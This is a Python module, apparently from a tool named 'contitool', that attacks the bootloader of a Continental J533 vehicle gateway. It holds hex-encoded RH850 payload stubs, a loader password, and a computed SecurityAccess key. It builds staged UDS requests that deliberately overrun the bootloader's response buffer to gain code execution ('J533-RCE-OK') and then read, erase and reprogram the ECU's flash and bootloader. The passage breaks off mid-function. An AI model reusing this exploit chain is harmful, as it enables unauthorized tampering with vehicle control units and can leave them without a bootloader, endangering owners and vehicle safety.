"""Self-contained RH850 service RAM-loader stubs, multi-DID UDS staging builders, and FBL SA2.

Every byte and SHA-256 digest here is 100% identical to the hardware-verified sequences.
"""

from __future__ import annotations

from functools import reduce
import hashlib
import struct

from contitool.can.hw_applets import (
    EEPROM_M95640_READER_STUB,
    EXPECTED_EEPROM_READER_STUB_SHA256,
    EXPECTED_OPBT_READER_STUB_SHA256,
    OPBT_READER_STUB,
    build_m95640_reader_payload,
    build_opbt_reader_payload,
)

from contitool.i18n import tr

LOADER_SYNC = b"\x84\x00\x00\x00\x00"
LOADER_PASSWORD = bytes.fromhex("de42565ee56524ed")
BEACON_ASCII = b"J533-RCE-OK"

# 1. RAM-Loader Readiness Beacon (35 bytes -> replies literal BEACON_ASCII on 0x6F1)
BEACON_PAYLOAD = bytes.fromhex(
    "26065081dffe0b3a1fd82106f0100001e1c760f91bf87f004a3533332d5243452d4f4b"
)
EXPECTED_BEACON_SHA256 = "9f64fb6ecc4a0e3d0bbce2af7f27abd07e378e4fe6d576539f0ffbba1dd47398"

# 2. Native Flash/RAM Reader Template (28 bytes -> calls 0x010010F0(r6=address, r7=length))
READER_PAYLOAD_SUFFIX = bytes.fromhex("1fd82106f0100001e1c760f91bf87f00")

# 3. Live RSA-1024 Verification Probe (92 bytes -> calls 0x010033FC on 0xFF*128, stores status at 0xFEDE9000)
RSA_PROBE_PAYLOAD = bytes.fromhex(
    "26060092defe003a2806000100001fd8210696100001e1c760f926068092defe2706ff000000"
    "280680000000210696100001e1c760f926068000000027068092defe2106fc330001e1c760f9"
    "1bf80a3826060090defe663f01007f00"
)
EXPECTED_RSA_PROBE_SHA256 = "c9ccaf4d657ccfcf8671e9a565af041da2c02b2b6a6b769e6334b2848edf4b3b"

# 4. One-Shot FACI Extended User Area (Uflash) Writer Stub (436 bytes RH850 machine code)
#    Reads 128-bit SELFID from Cflash+0xAB00, unlocks FENTRYR/FPROTR/FAREASELC=0x3B02,
#    erases 0x01000000..0x01007FFF, programs `r22` 256-byte pages from 0xFEDF82EC, exits P/E mode,
#    stores marker=1 & FSTATR to 0xFEDE9000, and replies 00 00 on 0x6F1.
UFLASH_FACI_STUB = bytes.fromhex(
    "e00760011fd829060090defe690701006907050002c226060080a0ff280600ab0000283f0100663f0100"
    "44424432283f0100663f010044424432283f0100663f010044424432283f0100663f0100444244325c32"
    "263f0100270601aa000026068400a1ff663f000027060155000026068800a1ff663f00002706023b0000"
    "26062000a1ff663f000027060000000126063000a1ff663f01002706ff7f000126063400a1ff663f0100"
    "26060000a2ff270650000000463f0000270620000000463f00002706d0000000463f000028068000a1ff"
    "289f0100d33e0080603ab2fd699f0500d33e0070603a8a553406000000013506ec82dffe360663000000"
    "26063000a1ff66a70100143eff0026063400a1ff663f010026060000a2ff270650000000463f00002706"
    "e8000000463f0000270680000000463f0000370680000000f53f0100663f0000283f0100c73e0004603a"
    "bafd42aa5fba60babaf52706d0000000463f0000289f0100d33e0080603ab2fd699f0500d33e0070603a"
    "fa0514a600015fb260b2cabd01c2270600aa000026068400a1ff663f00002706003b000026062000a1ff"
    "663f000069c70100e08760011bf87f00"
)
UFLASH_STUB_PAGES_IMM_OFFSET = 246  # `36 06 <pages_le32>` (`mov pages, r22`)
EXPECTED_ENGINEERING_UFLASH_SHA256 = "2a48df13ae14250928b3fc1ea0a2696751db877380422311e56536dad89ed8cd"
EXPECTED_ONE_SHOT_PAYLOAD_SHA256 = "bc6d6c6e3ac8a86668f96fc4b8876b04952cac9a57436815436e04efff13be6e"

# 5. Parameterized FACI DataFlash (0xFF200000..0xFF20FFFF) Writer Stub (784 bytes RH850 machine code)
#    Saves r20..r29/ep/lp on stack, kicks WDTA0/WDTA1, loads 128-bit FLID, enters DataFlash P/E mode
#    (FENTRYR=0xAA80, zero-based FSADDR/FEADDR offsets), erases 64B blocks and programs active 4B words
#    with hardware ECC, exits to Read mode, and stores (marker, FSTATR, last_offset) at 0xFEDE9000..0xFEDE900B.
DFLASH_FACI_STUB = bytes.fromhex(
    "031ed0ff63a7010063af050063b7090063bf0d0063c7110063cf150063d7190063df1d0063e7210063ef2500"
    "63f7290063ff2d00e007600180ffb80229060090defe69070100690705002706ffffffff693f090002c23906"
    "4884dffe1940283f0100603a8a15283f0500603aca0d283f0900603a8a0d283f0d00603aca05280600ab0000"
    "26060080a0ff283f0100663f010044424432283f0100663f010044424432283f0100663f010044424432283f"
    "0100663f0100444244325c32263f010026068400a1ffe63f0100603a820d270600aa0000663f0000e63f0100"
    "270680aa0000663f000027063000a1ff6707010027063400a1ff67070100370600000100330680000000e63f"
    "0100f339e2055fba60baaafd8007760128068000a1ff289f0100d33e0040603a920d26061000a1ff27061000"
    "0000463f00003c060000a2ff2706500000005c3f000039b7110019ce140060b2ba058007140180ff9601f9a7"
    "0100f9af030069a7090026063000a1ff66a70100143e3f0026063400a1ff663f01002706500000005c3f0000"
    "2706200000005c3f00002706d00000005c3f0000289f0100d33e0080603ab2fd699f0500d33e0070603ac205"
    "03c28007b60060aae24d19d6040014d869df090026063000a1ff66df01001b3e030026063400a1ff663f0100"
    "2706500000005c3f00002706e80000007c3f00002706020000007c3f0000fa3f01007c3f0000283f0100c73e"
    "0004603abafdfa3f03007c3f0000283f0100c73e0004603abafd2706d00000007c3f0000289f0100d33e0080"
    "603ab2fd699f0500d33e0070603ac20504c28007220044d244da5faa60aafab519ce44005fb260b2b205bf07"
    "f4fe01c280071e0026061000a1ff270610000000463f00002706500000005c3f000026068400a1ff270600aa"
    "0000663f0000370600000100e63f0100603ac2055fba60baaafd80ff420069c70100e087600123a7010023af"
    "050023b7090023bf0d0023c7110023cf150023d7190023df1d0023e7210023ef250023f7290023ff2d00031e"
    "30007f00200eacff40f6edff800b6810811184131ef60010800b6810811184137f000000"
)
EXPECTED_DFLASH_FACI_STUB_SHA256 = "762e3754687b3595587a63d40d3703ee93f1cee5a09027549720ddb465da7b57"
DFLASH_BLOCK_SIZE = 64
DFLASH_ICUS_RESERVED_OFFSET = 0xF800  # Top 2 KB (0xF800..0xFFFF) hardware-guarded for ICUSB SHE keys
MAX_DFLASH_BLOCKS_PER_PACKET = 400

# 6. Parameterized FACI CodeFlash / Extended User Area Writer Stub (696 bytes RH850 machine code)
#    Supports 8 KB boot blocks (0x00000000..0x0000FFFF), 32 KB app blocks (0x00010000..0x0017FFFF),
#    and full 128-page Extended User Area (0x01000000..0x01007FFF) with WDTA0/WDTA1 servicing.
CFLASH_FACI_STUB = bytes.fromhex(
    "031ed0ff63a7010063af050063b7090063bf0d0063c7110063cf150063d7190063df1d0063e7210063ef2500"
    "63f7290063ff2d00e007600180ff620229060090defe69070100690705002706ffffffff693f090002c23906"
    "f083dffe1940283f0100603a8a15283f0500603aca0d283f0900603a8a0d283f0d00603aca05280600ab0000"
    "26060080a0ff283f0100663f010044424432283f0100663f010044424432283f0100663f010044424432283f"
    "0100663f0100444244325c32263f0100270601aa000026068400a1ff663f000027060155000026068800a1ff"
    "663f0000393f110026062000a1ff663f000028068000a1ff3c060000a2ff393f1500603a9235393f1900693f"
    "090026063000a1ff663f0100393f1d0026063400a1ff663f01002706500000005c3f00002706200000005c3f"
    "00002706d00000005c3f000080ff5a01289f0100d33e0080603a92fd699f0500d33e0070603ac20503c28007"
    "ac0039a7210039b7250019ae280060b2a24d80ff280169a7090026063000a1ff66a70100143eff0026063400"
    "a1ff663f01002706500000005c3f00002706e80000005c3f00002706800000005c3f0000370680000000f53f"
    "01007c3f0000283f0100c73e0004603abafd42aa5fba60babaf52706d00000005c3f0000289f0100d33e0080"
    "603ab2fd699f0500d33e0070603ac20504c28007140014a600015fb260b28abd01c280071e0026061000a1ff"
    "270610000000463f00002706500000005c3f00002706003b000026062000a1ff663f000026068400a1ff2706"
    "00aa0000663f0000370600000100e63f0100603ac2055fba60baaafd80ff420069c70100e087600123a70100"
    "23af050023b7090023bf0d0023c7110023cf150023d7190023df1d0023e7210023ef250023f7290023ff2d00"
    "031e30007f00200eacff40f6edff800b6810811184131ef60010800b6810811184137f00"
)
EXPECTED_CFLASH_FACI_STUB_SHA256 = "40f108251595274a3e15dc2b1886872b986ceca1685a93aa3e70741cb3653dc2"
MAX_CFLASH_PAGES_PER_PACKET = 96

# 7. Parameterized FACI Blank-Check DataFlash Reader Stub (652 bytes RH850 machine code)
#    Saves r20..r29/ep/lp, authenticates FLID from 0x0000AB00, enters DataFlash P/E mode (FENTRYR=0xAA80),
#    executes hardware Blank Check (0x71 -> 0xD0, FBCSTAT @ 0xFFA100D4) per 4-byte word while kicking FBL's
#    watchdog service 0x01000EF0 every 256 bytes, exits to Read mode, fills 0xFFFFFFFF for blank words without
#    reading erased RV40F cells (reading only BCST==1 words via CPU), and streams via 0x010010F0.
DFLASH_READER_STUB = bytes.fromhex(
    "031ed0ff63a7010063af050063b7090063bf0d0063c7110063cf150063d7190063df1d0063e7210063ef2500"
    "63f7290063ff2d003906c483dffe39a7010039af050039b7090039ef0d0080ff3202380600a0dffe15c8013a"
    "783f010044c25cca60cabafd280600ab000026060080a0ff283f0100663f010044424432283f0100663f0100"
    "44424432283f0100663f010044424432283f0100663f0100444244325c32263f010026068400a1ffe63f0100"
    "603a820d270600aa0000663f0000e63f0100270680aa0000663f000027063000a1ff6707010027063400a1ff"
    "67070100320600000100330680000000e63f0100f339e2055f926092aafd8007d2003a068000a1ff3c060000"
    "a2ff3a9f0100d33e0040603a920d26061000a1ff270610000000463f00002706500000005c3f0000d4beffff"
    "380600a0dffe15c8d93eff00603aba0580ff380126063000a1ff66bf0100173e030026063400a1ff663f0100"
    "2706500000005c3f00002706710000005c3f00002706d00000005c3f00003a9f0100d33e0080603ab2fdd33e"
    "0070603a821526061000a1ff270610000000463f00002706500000005c3f0000013a850d2606d400a1ff863f"
    "0100c73e0100783f010044ba44c25cca60ca9abd26068400a1ff270600aa0000663f0000320600000100e63f"
    "0100603ac2055f926092aafde63f010080ff880014b8380600a0dffe15c8383f0100603aba051f3ab505373f"
    "0100783f010044ba44c25cca60caaaf580ff5c00260600a0dffe15382106f0100001e1c760f980ff4600d5a1"
    "5fb260b2b205bf0708fe23a7010023af050023b7090023bf0d0023c7110023cf150023d7190023df1d0023e7"
    "210023ef250023f7290023ff2d00031e30007f0060ead2052106f00e000161007f000000"
)
EXPECTED_DFLASH_READER_STUB_SHA256 = "a10ab77a68ee4c120b0cebd2831c3880aee912a746f5d24043a873096fb2fb15"
DFLASH_READER_MAX_CHUNK = 16384  # 0xFEDFA000..0xFEDFDFFF scratch capacity (<= 4096 recommended on hardware)
DFLASH_READER_MAX_CALLS = 64

# 8. Watchdog-fed native reader (assembled by Ghidra at 0x0100120E; verified on a 3Q0907530C SW 521:
#    full CodeFlash 61 s instead of 148 s, byte-identical to the stock reader and to an earlier backup):
#      mov 0xfede9000,r6; st.w r24..r27,lp,0..16[r6]; mov ADDR,r24; mov LEN,r26
#      N x { mov 0x01000ef0,r1; jarl [r1],lp; mov r24,r6; mov r26,r7; mov 0x010010f0,r1; jarl [r1],lp; add r26,r24 }
#      mov 0x01000ef0,r1; jarl [r1],lp; mov 0xfede9000,r6; ld.w 0..16[r6],r24..r26,lp; mov lp,r27; jmp [lp]
#    The FBL arms WDTA0/1 with MD = 0x77 (2^16 / 240 kHz = 0.273 s) and kicks them only right before it runs a
#    payload; 0x010010F0 does not kick while streaming (a single 16 KB request reset the ECU after 269.6 ms).
#    So every read inside one payload is preceded by the FBL's own WDTA service 0x01000EF0 (clobbers r1, r2, ep).
#    Like the stock reader, it returns with r27 = lp.
FED_READER_PROLOGUE = bytes.fromhex("26060090defe66c7010066cf050066d7090066df0d0066ff1100")
FED_READER_KICK = bytes.fromhex("2106f00e0001e1c760f9")
FED_READER_READ = bytes.fromhex("18301a382106f0100001e1c760f9dac1")
FED_READER_EPILOGUE = bytes.fromhex("26060090defe26c7010026cf050026d7090026ff11001fd87f00")
FED_READER_CHUNK = 4096  # one read streams ~0.13 s of the 0.273 s watchdog window
FED_READER_MAX_CALLS = 64
# The 2-read template exactly as Ghidra assembled it (ADDR = 0x11223344, LEN = 0x1000)
_FED_READER_ASSEMBLED_2X = bytes.fromhex(
    "26060090defe66c7010066cf050066d7090066df0d0066ff1100380644332211" "3a0600100000"
    + "2106f00e0001e1c760f918301a382106f0100001e1c760f9dac1" * 2
    + "2106f00e0001e1c760f9" "26060090defe26c7010026cf050026d7090026ff11001fd87f00"
)

# 9. Factory Loader Reset Payload (2 bytes -> resets MCU back into Application)
LOADER_RESET_PAYLOAD = b"\xfe\xff"
MAX_LOADER_PACKET_SIZE = 0x7DB8  # Hardware limit enforced by 0x0100120E in Uflash

UNKNOWN_DIDS: tuple[int, ...] = (0x000E, 0x1200, 0x0100)


def build_loader_packet(payload: bytes) -> bytes:
    """Wrap raw RH850 payload into a factory 0x6F0 RAM-loader packet with password & XOR checksum."""
    size = max(0x120, (0x118 + len(payload) + 0xF) & ~0xF)
    if size > MAX_LOADER_PACKET_SIZE:
        raise ValueError(
            f"RAM-loader packet size 0x{size:X} exceeds 0x0100120E buffer limit 0x{MAX_LOADER_PACKET_SIZE:X}"
        )
    packet = bytearray(size + 3)
    packet[:2] = bytes([size & 0xFF, 0x80 | (size >> 8)])
    packet[0x110:0x118] = LOADER_PASSWORD
    packet[0x118 : 0x118 + len(payload)] = payload
    packet[-1] = reduce(lambda a, b: a ^ b, packet[:-1], 0)
    return bytes(packet)


def build_reader_payload(address: int, length: int) -> bytes:
    """Build 28-byte RH850 native reader payload for `address` and `length` (1..65535)."""
    if not 1 <= length <= 0xFFFF:
        raise ValueError(f"Native reader length must be 1..65535, got {length}")
    return (
        b"\x26\x06"
        + struct.pack("<I", address & 0xFFFFFFFF)
        + b"\x27\x06"
        + struct.pack("<I", length & 0xFFFFFFFF)
        + READER_PAYLOAD_SUFFIX
    )


def build_fed_reader_payload(address: int, length: int, calls: int) -> bytes:
    """`calls` native reads of `length` bytes from `address` in one payload, kicking WDTA0/1 before each read."""
    if not 8 <= length <= FED_READER_CHUNK or length % 8:
        raise ValueError(f"Fed reader length must be a multiple of 8 in 8..{FED_READER_CHUNK}, got {length}")
    if not 1 <= calls <= FED_READER_MAX_CALLS:
        raise ValueError(f"Fed reader calls must be 1..{FED_READER_MAX_CALLS}, got {calls}")
    return (
        FED_READER_PROLOGUE
        + b"\x38\x06" + struct.pack("<I", address & 0xFFFFFFFF)
        + b"\x3a\x06" + struct.pack("<I", length)
        + (FED_READER_KICK + FED_READER_READ) * calls
        + FED_READER_KICK
        + FED_READER_EPILOGUE
    )


def build_dflash_reader_payload(
    address: int,
    length: int,
    *,
    calls: int = 1,
    feed: bool = True,
) -> bytes:
    """Build RH850 FACI Blank-Check DataFlash reader payload (`0xFF200000..0xFF20FFFF`).

    Performs per-word FACI `0x71 -> 0xD0` Blank Check (`FBCSTAT @ 0xFFA100D4`) while kicking FBL's
    `0x01000EF0` watchdog service every 256 bytes, returning deterministic `0xFF` for all blank words.
    """
    if address < 0xFF200000 or address >= 0xFF210000 or address % 4 != 0:
        raise ValueError(
            f"DataFlash reader start address must be 4-byte aligned in 0xFF200000..0xFF20FFFC, got 0x{address:08X}"
        )
    if not 4 <= length <= DFLASH_READER_MAX_CHUNK or length % 4 != 0:
        raise ValueError(
            f"DataFlash reader chunk length must be a multiple of 4 in 4..{DFLASH_READER_MAX_CHUNK}, got {length}"
        )
    if not 1 <= calls <= DFLASH_READER_MAX_CALLS:
        raise ValueError(f"DataFlash reader calls must be 1..{DFLASH_READER_MAX_CALLS}, got {calls}")
    if calls > 1 and length % 8 != 0:
        raise ValueError(f"Multi-call DataFlash reader chunk length must be a multiple of 8, got {length}")
    if address + length * calls > 0xFF210000:
        raise ValueError(
            f"DataFlash reader span 0x{address:08X}..0x{address + length * calls:08X} exceeds 0xFF210000"
        )
    header = struct.pack("<IIII", address, length, calls, 1 if feed else 0)
    return DFLASH_READER_STUB + header


def build_uflash_one_shot_payload(uflash_32k: bytes) -> tuple[bytes, int]:
    """Build self-contained FACI one-shot Uflash erase+program payload (436B stub + non-FF pages)."""
    if len(uflash_32k) != 0x8000:
        raise ValueError(f"Expected 32,768-byte Uflash image, got {len(uflash_32k)}")
    trimmed_len = len(uflash_32k.rstrip(b"\xff"))
    pages = max(1, (trimmed_len + 255) // 256)
    if pages > 122:
        raise ValueError(
            f"Non-0xFF Uflash data ({pages} pages = {pages * 256} B) exceeds safe single-shot RAM buffer limit"
        )
    stub = bytearray(UFLASH_FACI_STUB)
    if stub[UFLASH_STUB_PAGES_IMM_OFFSET : UFLASH_STUB_PAGES_IMM_OFFSET + 2] != b"\x36\x06":
        raise RuntimeError("Corrupted UFLASH_FACI_STUB page-count instruction")
    struct.pack_into("<I", stub, UFLASH_STUB_PAGES_IMM_OFFSET + 2, pages)
    payload = bytes(stub) + uflash_32k[: pages * 256]
    if hashlib.sha256(uflash_32k).hexdigest() == EXPECTED_ENGINEERING_UFLASH_SHA256:
        if hashlib.sha256(payload).hexdigest() != EXPECTED_ONE_SHOT_PAYLOAD_SHA256:
            raise RuntimeError("Self-test failed: one-shot Uflash payload SHA-256 mismatch")
    return payload, pages


# The ZDC passport and datasets (DataFlash 0x0000..0x303F) are not read through R_FDL: the gateway copies them to
# RAM with a plain CPU read (firmware 5366 copy loop 0x0007EE04) and checks their CRC there. An erased cell reads
# back as noise, not 0xFF, so every word of a data-bearing block there must be programmed — 0xFFFFFFFF included.
# Seen on the bench 2026-11-09: a FPA dataset written with its trailing FF word left blank read 2 noise bytes, the
# CRC failed in the gateway and it reported ZDC #4 invalid (DTC 000401), while the blank-check readback "matched".
DFLASH_MEMCPY_END = 0x3040


def dflash_active_word_count(block_64b: bytes, offset: int | None = None) -> int:
    """Return number of 4-byte words (0..16) to program after erasing a 64-byte DataFlash block.

    Preserves valid hardware ECC over active records (including interior 0xFFFFFFFF words) while
    leaving trailing 0xFF padding genuinely blank (BCST == 0) as required by R_FDL / Fls_Read — except in the ZDC
    area (`offset` < DFLASH_MEMCPY_END), read by plain memcpy, where a block holding data is programmed whole.
    """
    if len(block_64b) != DFLASH_BLOCK_SIZE:
        raise ValueError(f"Expected 64-byte DataFlash block, got {len(block_64b)}")
    if dflash_needs_full_program(block_64b, offset):
        return DFLASH_BLOCK_SIZE // 4
    return (len(block_64b.rstrip(b"\xff")) + 3) // 4


def dflash_needs_full_program(block_64b: bytes, offset: int | None) -> bool:
    """A data-bearing block of the memcpy-read ZDC area whose trailing 0xFF words an R_FDL-style write leaves blank."""
    return (
        offset is not None
        and offset < DFLASH_MEMCPY_END
        and block_64b != b"\xff" * DFLASH_BLOCK_SIZE
        and block_64b.endswith(b"\xff\xff\xff\xff")
    )


def _normalize_flid(flid_16b: bytes | None) -> bytes:
    if flid_16b is None:
        return b"\x00" * 16
    if len(flid_16b) != 16:
        raise ValueError(f"Expected 16-byte FLID/SELFID, got {len(flid_16b)}")
    return bytes(flid_16b)


def build_dflash_faci_payloads(
    blocks: list[tuple[int, bytes]],
    *,
    flid_16b: bytes | None = None,
    allow_icus_tail: bool = False,
    max_blocks_per_packet: int = MAX_DFLASH_BLOCKS_PER_PACKET,
) -> list[bytes]:
    """Build 1..N self-contained FACI DataFlash erase+program payloads for the specified 64B blocks."""
    if not blocks:
        return []
    if not 1 <= max_blocks_per_packet <= MAX_DFLASH_BLOCKS_PER_PACKET:
        raise ValueError(f"Invalid max_blocks_per_packet={max_blocks_per_packet}")
    flid = _normalize_flid(flid_16b)
    limit = 0x10000 if allow_icus_tail else DFLASH_ICUS_RESERVED_OFFSET

    normalized: list[tuple[int, int, bytes]] = []
    seen_offsets: set[int] = set()
    for offset, block_data in blocks:
        if offset < 0 or offset >= 0x10000 or offset % DFLASH_BLOCK_SIZE != 0:
            raise ValueError(f"DataFlash block offset must be 64-byte aligned in 0x0000..0xFFC0, got 0x{offset:X}")
        if offset >= limit:
            raise ValueError(
                f"DataFlash offset 0x{offset:04X} falls inside hardware-guarded ICUSB region (>= 0x{DFLASH_ICUS_RESERVED_OFFSET:04X})"
            )
        if offset in seen_offsets:
            raise ValueError(f"Duplicate DataFlash block offset 0x{offset:04X}")
        seen_offsets.add(offset)
        words = dflash_active_word_count(block_data, offset)
        normalized.append((offset, words, bytes(block_data)))

    payloads: list[bytes] = []
    for start in range(0, len(normalized), max_blocks_per_packet):
        batch = normalized[start : start + max_blocks_per_packet]
        buf = bytearray(DFLASH_FACI_STUB)
        buf.extend(flid)
        buf.extend(struct.pack("<I", len(batch)))
        for offset, words, block_data in batch:
            buf.extend(struct.pack("<HH", offset, words))
            buf.extend(block_data)
        payloads.append(bytes(buf))
    return payloads


def cflash_block_ranges() -> list[tuple[int, int, int]]:
    """Return all 54 physical CodeFlash erase blocks of R7F7010543 / R7F7010563:
    - Blocks 0..7   : 8 x 8 KB  (0x00000000 .. 0x0000FFFF)
    - Blocks 8..53  : 46 x 32 KB (0x00010000 .. 0x0017FFFF)
    """
    ranges: list[tuple[int, int, int]] = []
    for idx in range(8):
        ranges.append((idx, idx * 0x2000, (idx + 1) * 0x2000))
    for idx in range(8, 54):
        base = 0x00010000 + (idx - 8) * 0x8000
        ranges.append((idx, base, base + 0x8000))
    return ranges


def build_cflash_faci_block_payloads(
    block_start: int,
    block_bytes: bytes,
    *,
    extended: bool = False,
    flid_16b: bytes | None = None,
    max_pages_per_packet: int = MAX_CFLASH_PAGES_PER_PACKET,
) -> list[bytes]:
    """Build 1 or 2 FACI erase+program payloads for one physical CodeFlash (or Extended User Area) block."""
    if not 1 <= max_pages_per_packet <= MAX_CFLASH_PAGES_PER_PACKET:
        raise ValueError(f"Invalid max_pages_per_packet={max_pages_per_packet}")
    flid = _normalize_flid(flid_16b)
    if extended:
        if block_start != 0x01000000 or len(block_bytes) != 0x8000:
            raise ValueError(f"Extended User Area block must be 32 KB at 0x01000000, got 0x{block_start:08X} ({len(block_bytes)} B)")
        fareaselc = 0x3B02
    else:
        valid = {(s, e - s) for _, s, e in cflash_block_ranges()}
        if (block_start, len(block_bytes)) not in valid:
            raise ValueError(
                f"Invalid physical CodeFlash block 0x{block_start:08X} ({len(block_bytes)} B); "
                "expected 8 KB in 0x00000000..0x0000FFFF or 32 KB in 0x00010000..0x0017FFFF"
            )
        fareaselc = 0x3B00

    erase_end = block_start + len(block_bytes) - 1
    trimmed_len = len(block_bytes.rstrip(b"\xff"))
    total_pages = (trimmed_len + 255) // 256

    if total_pages == 0:
        header = struct.pack(
            "<16sIIIIII",
            flid,
            fareaselc,
            1,
            block_start,
            erase_end,
            block_start,
            0,
        )
        return [CFLASH_FACI_STUB + header]

    # Split evenly into 2 packets when > max_pages_per_packet (e.g. 97..128 pages -> 64 + rest)
    step = min(64, max_pages_per_packet) if total_pages > max_pages_per_packet else total_pages
    payloads: list[bytes] = []
    for page_idx in range(0, total_pages, step):
        cnt = min(step, total_pages - page_idx)
        do_erase = 1 if page_idx == 0 else 0
        p_addr = block_start + page_idx * 256
        chunk = block_bytes[page_idx * 256 : (page_idx + cnt) * 256]
        header = struct.pack(
            "<16sIIIIII",
            flid,
            fareaselc,
            do_erase,
            block_start,
            erase_end,
            p_addr,
            cnt,
        )
        payloads.append(CFLASH_FACI_STUB + header + chunk)
    return payloads


def build_uflash_faci_payloads(
    uflash_32k: bytes,
    *,
    flid_16b: bytes | None = None,
) -> tuple[list[bytes], int]:
    """Build the one-packet Uflash FACI payload (erase + program + verify in a single RAM stub run).

    A two-packet write is refused: packet 1 erases the whole 32 KB Uflash, and packet 2 would then be received by
    the factory loader (0x0100120E, using 0x010010F0 / 0x01000EF0) running from that half-rewritten Uflash. Any
    CAN error or power drop between the packets leaves the ECU without a bootloader. Every 3Q0907530 Uflash seen
    uses 99 pages (data up to +0x622C), well inside the 122-page one-packet limit."""
    if len(uflash_32k) != 0x8000:
        raise ValueError(f"Expected 32,768-byte Uflash image, got {len(uflash_32k)}")
    trimmed_len = len(uflash_32k.rstrip(b"\xff"))
    pages = max(1, (trimmed_len + 255) // 256)
    if pages > 122 or flid_16b is not None:
        raise ValueError(
            tr(
                f"Образ Uflash занимает {pages} страниц — больше 122, его нельзя записать одним пакетом. "
                "Запись двумя пакетами может оставить блок без загрузчика, поэтому она запрещена. "
                "Проверьте, что это загрузчик именно этого блока (обычно 99 страниц).",
                f"The Uflash image uses {pages} pages — more than 122, so it cannot be written in one packet. "
                "A two-packet write can leave the ECU without a bootloader and is refused. "
                "Check that this is this ECU's own bootloader (usually 99 pages).",
            )
        )
    one_shot, count = build_uflash_one_shot_payload(uflash_32k)
    return [one_shot], count


# The staged request is a multi-DID read whose answer must measure exactly STAGE1_TOTAL bytes and end in 04 10 05.
# The three crafted DIDs carry the descriptor address 0x0100120E in their DID numbers; the ECU does not support
# them and leaves them out of the answer, so the repeats of F17C and F15B are padding that places the write.
# Every length involved is a constant in the firmware — the bootloader's F15B handler copies two 10-byte NvM
# records in a loop that always runs twice — so the layout of this answer is the same on every gateway.
#
# Both staged answers overrun the bootloader's response buffer (0xFEDE0B18, cleared with memset(.., 0, 0x14A), so
# 330 bytes) onto the request dispatcher's state block that follows it:
#   stage 1, 338 bytes: resp[330..337] -> 0xFEDE0C62..69, ending 04 10 05 (0410 last, value from 2E 0410 05)
#   stage 2, 337 bytes: resp[330..336] -> 0xFEDE0C62..68, ending 04 10 48
# Stage 2 rewrites all of it but 0C69, so stage 1 is there for its overrun (0C69 = 05), not for its answer.
# 0C62 is the suppress-positive-response flag: stage 2 lands FAZIT digits on it and is never answered, and the
# trigger works all the same. Stage 1 lands bytes 5..9 of the last F15B record on 0C62..0C66: tester serial
# bytes 2..5 of the last `2E F15A` and a status byte. Every stage-1 answer logged so far had zero on 0C62 and
# 0C64; the serial 01 02 03 04 05 06 that ContiTool wrote up to 2.0.1d puts 03 / 05 there and silences it.
STAGE1_TOTAL = 338
KNOWN_DID_LENGTHS: dict[int, int] = {0xF17C: 23, 0xF1A2: 6, 0xF15B: 20, 0x0410: 1}
STAGE1_KNOWN = [0xF17C] * 6 + [0xF1A2, 0xF15B]
STAGE1_KNOWN_TAIL = [0xF15B] * 7 + [0x0410]
STAGE1_OVERRUN = 330  # resp[330:] is what landed on 0xFEDE0C62..69
# Tester serial for `2E F15A` (date + these 6 bytes). Its bytes 2..5 land on 0C62..0C65 in stage 1 (see above):
# all zero, as on the factory record of a gateway that answered. `2E F15A` itself only fills a RAM buffer
# (0xFEDE0AF8, handler 0x0100440E); the bootloader stores it into a block's F15B record only while erasing that
# block (31 01 FF 00, 0x0100323E), so a bad record on the application block goes away with the next app write.
FBL_TESTER_SERIAL = bytes(6)


def _did_req(entries: list[int]) -> bytes:
    return bytes([0x22]) + b"".join(did.to_bytes(2, "big") for did in entries)


def build_service_loader_uds_steps() -> tuple[bytes, bytes, bytes]:
    """Return (stage1_did_req, stage2_did_req, sa_trigger_req) as pure ISO 14229 UDS frames."""
    stage1 = [*STAGE1_KNOWN, *UNKNOWN_DIDS, *STAGE1_KNOWN_TAIL]
    stage2 = [0xF15B] * 8 + list(UNKNOWN_DIDS) + [0xF15B] * 6 + [0xF17C, 0x0410]
    trigger = bytes.fromhex("2712deadbeef0000000000000000000000000e120001")
    return _did_req(stage1), _did_req(stage2), trigger


def fbl_sa2(seed: int) -> int:
    """Compute Continental J533 FBL SecurityAccess Level 0x11/0x12 key via exact VAG SA2 VM algorithm."""
    x = seed & 0xFFFFFFFF
    for step in range(8):
        msb = (x >> 31) & 1
        x = ((x << 1) | (1 if step in (2, 7) else 0)) & 0xFFFFFFFF
        if msb:
            x ^= 0x1EDC6F41
    for _ in range(11):
        borrow = x < 0x80361423
        x = (x - 0x80361423) & 0xFFFFFFFF
        if borrow:
            x ^= 0x04000200
    return x


def verify_payload_self_tests() -> None:
    """Verify embedded payload digests and SA2 reference vectors."""
    if hashlib.sha256(BEACON_PAYLOAD).hexdigest() != EXPECTED_BEACON_SHA256:
        raise RuntimeError("Embedded BEACON_PAYLOAD SHA-256 self-test failed")
    if hashlib.sha256(RSA_PROBE_PAYLOAD).hexdigest() != EXPECTED_RSA_PROBE_SHA256:
        raise RuntimeError("Embedded RSA_PROBE_PAYLOAD SHA-256 self-test failed")
    if len(UFLASH_FACI_STUB) != 436:
        raise RuntimeError("Embedded UFLASH_FACI_STUB length self-test failed")
    if len(DFLASH_FACI_STUB) != 784 or hashlib.sha256(DFLASH_FACI_STUB).hexdigest() != EXPECTED_DFLASH_FACI_STUB_SHA256:
        raise RuntimeError("Embedded DFLASH_FACI_STUB SHA-256 self-test failed")
    if len(CFLASH_FACI_STUB) != 696 or hashlib.sha256(CFLASH_FACI_STUB).hexdigest() != EXPECTED_CFLASH_FACI_STUB_SHA256:
        raise RuntimeError("Embedded CFLASH_FACI_STUB SHA-256 self-test failed")
    if len(DFLASH_READER_STUB) != 652 or hashlib.sha256(DFLASH_READER_STUB).hexdigest() != EXPECTED_DFLASH_READER_STUB_SHA256:
        raise RuntimeError("Embedded DFLASH_READER_STUB SHA-256 self-test failed")
    if build_fed_reader_payload(0x11223344, 0x1000, 2) != _FED_READER_ASSEMBLED_2X:
        raise RuntimeError("Fed reader builder differs from its assembled template")
    from contitool.can.hw_applets import (
        EEPROM_M95640_READER_STUB,
        EXPECTED_EEPROM_READER_STUB_SHA256,
        EXPECTED_OPBT_READER_STUB_SHA256,
        OPBT_READER_STUB,
    )

    if hashlib.sha256(OPBT_READER_STUB).hexdigest() != EXPECTED_OPBT_READER_STUB_SHA256:
        raise RuntimeError("Embedded OPBT_READER_STUB SHA-256 self-test failed")
    if hashlib.sha256(EEPROM_M95640_READER_STUB).hexdigest() != EXPECTED_EEPROM_READER_STUB_SHA256:
        raise RuntimeError("Embedded EEPROM_M95640_READER_STUB SHA-256 self-test failed")
    sa2_vectors = {
